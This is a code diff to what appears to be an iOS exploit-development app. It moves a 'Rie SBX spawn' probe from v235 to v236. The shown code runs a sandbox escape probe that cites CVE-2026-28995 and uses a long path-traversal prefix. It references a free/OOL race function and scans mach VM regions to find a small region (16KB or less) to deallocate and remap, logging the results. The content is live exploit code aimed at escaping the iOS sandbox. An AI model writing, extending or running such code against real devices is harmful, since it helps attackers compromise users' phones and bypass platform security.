@@ -943,7 +943,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
     rieConf.baseBackgroundColor = [UIColor systemPinkColor];
     self.rieProbeButton.configuration = rieConf;
-    [self.rieProbeButton setTitle:@"Rie SBX spawn (v235)" forState:UIControlStateNormal];
+    [self.rieProbeButton setTitle:@"Rie SBX spawn (v236)" forState:UIControlStateNormal];
     [self.rieProbeButton addTarget:self action:@selector(rieProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.rieProbeButton];
 
@@ -9166,7 +9166,7 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v235: deallocate ENTIRE region + re-map probe ===\n"];
+        [self appendLog:@"\n=== Rie v236: fix small-region scan filter ===\n"];
         NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
@@ -9718,9 +9718,11 @@ static uint64_t rie_find_exec_base(task_t task,
             Rie_VMRegionRecurseFn vrr5 = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
 
             if (vm_dealloc && vrr5) {
-                // Step 0: find the last dyld region (smallest, least critical)
+                // Step 0: find last SMALL region (≤16KB) — ideal dealloc target
                 rie_mach_vm_address_t lastRegionAddr = 0;
                 rie_mach_vm_size_t lastRegionSize = 0;
+                rie_mach_vm_address_t finalRegionAddr = 0;
+                rie_mach_vm_size_t finalRegionSize = 0;
                 {
                     rie_mach_vm_address_t w = 0x180000000ULL;
                     for (int ri = 0; ri < 80; ri++) {
@@ -9731,8 +9733,12 @@ static uint64_t rie_find_exec_base(task_t task,
                         if (vrr5(mach_task_self(), &w, &vs, &d,
                             (rie_vm_region_recurse_info_t)info, &cnt) != KERN_SUCCESS) break;
                         if (w >= 0x200000000ULL) break;
-                        lastRegionAddr = w;
-                        lastRegionSize = vs;
+                        finalRegionAddr = w;
+                        finalRegionSize = vs;
+                        if (vs > 0 && vs <= 0x4000) {
+                            lastRegionAddr = w;
+                            lastRegionSize = vs;
+                        }
                         w += vs;
                     }
                 }
@@ -9791,7 +9797,9 @@ static uint64_t rie_find_exec_base(task_t task,
                         }
                     }
                 } else {
-                    [self appendLog:@"  no suitable small region found"];
+                    [self appendLog:[NSString stringWithFormat:
+                        @"  no small region in scan (final region: a=0x%llx sz=0x%llx)",
+                        (unsigned long long)finalRegionAddr, (unsigned long long)finalRegionSize]];
                 }
             } else {
                 [self appendLog:[NSString stringWithFormat:@"  dealloc=%p vrr=%p", vm_dealloc, vrr5]];
